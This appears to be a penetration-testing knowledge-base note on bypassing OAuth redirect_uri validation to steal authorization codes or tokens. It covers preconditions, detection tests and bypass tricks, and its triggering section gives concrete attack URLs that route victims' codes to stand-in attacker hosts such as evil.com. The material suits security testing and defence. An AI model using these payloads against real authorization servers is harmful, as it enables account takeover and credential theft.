---
title: OAuth redirect_uri bypass to auth code / token theft
slug: redirect-uri-bypass
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/oauth, technique/redirect-uri, sink/auth-code]
inbound: []
---

# OAuth redirect_uri bypass to auth code / token theft

## Pattern

The authorization server validates `redirect_uri` with an incomplete check (prefix match, whitelist bypass, path traversal, or parameter pollution). An attacker registers a crafted `redirect_uri` that passes validation but delivers the authorization code or implicit token to attacker-controlled infrastructure.

## Preconditions

- The app uses OAuth authorization code or implicit flow.
- The authorization server validates `redirect_uri` but the check can be bypassed.
- The attacker can direct the victim to the crafted authorization URL (via phishing, CSRF, or open redirect).

## Detection

- `redirect_uri` parameter present in `/oauth/authorize` or `/auth` requests.
- Test prefix bypass: append `/../` or `%2F..%2F` to the registered callback path.
- Test parameter pollution: supply `redirect_uri=legit.com&redirect_uri=evil.com`.
- Test subdomain bypass: `legit.com.evil.com`, `evil-legit.com`.
- Test localhost: `localhost.evil.com` or `127.0.0.1` if dev flow is permitted in prod.
- Recon endpoint: `GET /.well-known/oauth-authorization-server` — check `redirect_uris_supported` policies.

## Triggering

Prefix-match bypass (path traversal):
```
https://oauth-server.com/authorize?client_id=123&redirect_uri=https://client-app.com/oauth/callback/../../attacker-controlled&response_type=code
```

Parameter pollution (server takes first or last):
```
https://oauth-server.com/authorize?client_id=123&redirect_uri=https://client-app.com/callback&redirect_uri=https://evil.com&response_type=code
```

Subdomain / special character confusion:
```
https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
```

Localhost bypass in production:
```
https://oauth-server.com/authorize?client_id=123&redirect_uri=http://localhost.evil-user.net/callback&response_type=code
```

Open redirect chaining (steal code via Referer):
```
https://oauth-server.com/authorize?client_id=123&redirect_uri=https://client-app.com/oauth/callback?next=https://evil.com&response_type=code
```
(victim lands on client-app open redirect → Referer on the evil.com page carries the `?code=` param)

## Bypasses

- Some servers block exact-match misses but allow path traversal (`/../`).
- URL encoding: `%2F..%2F` may bypass string comparison but normalize at redirect time.
- Fragment-based: `https://legit.com/#@evil.com` — browser sends to legit.com but `#@evil.com` in fragment leaks via `document.referrer` if legit.com has a sub-page.
- `response_mode=fragment` causes token to land in the URL fragment, reducing Referer leakage but exposing via `postMessage`-leaking pages.

## Seen-in-the-wild

(none yet)

## References

- [PortSwigger OAuth authentication](../../sources/portswigger-oauth.md)
- [OAuth SUMMARY](SUMMARY.md)
